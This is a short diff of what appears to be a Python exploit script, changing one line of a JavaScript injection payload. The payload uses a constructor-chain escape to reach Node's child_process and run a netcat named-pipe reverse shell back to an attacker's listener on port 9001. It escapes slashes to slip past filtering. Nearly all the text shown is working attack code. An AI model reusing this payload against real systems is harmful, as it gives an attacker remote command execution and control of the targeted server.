@@ -25,7 +25,7 @@ def send_request(target):
 	print("Sending reverse shell... Ensure netcat listening on port 9001")
 
 	shell_cmd = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
-	cmd = f"parts[0].constructor.constructor('return process')().mainModule.require('child_process').exec(\'{shell_cmd}\')"
+	cmd = f"parts.constructor.constructor('return process')().mainModule.require('child_process').exec(\'{shell_cmd}\')"
 	cmd = cmd.replace("/", "\\\\x2f")
 	# Put 2 \\ so that it can be resolved twice by Python, once here and once in request
 
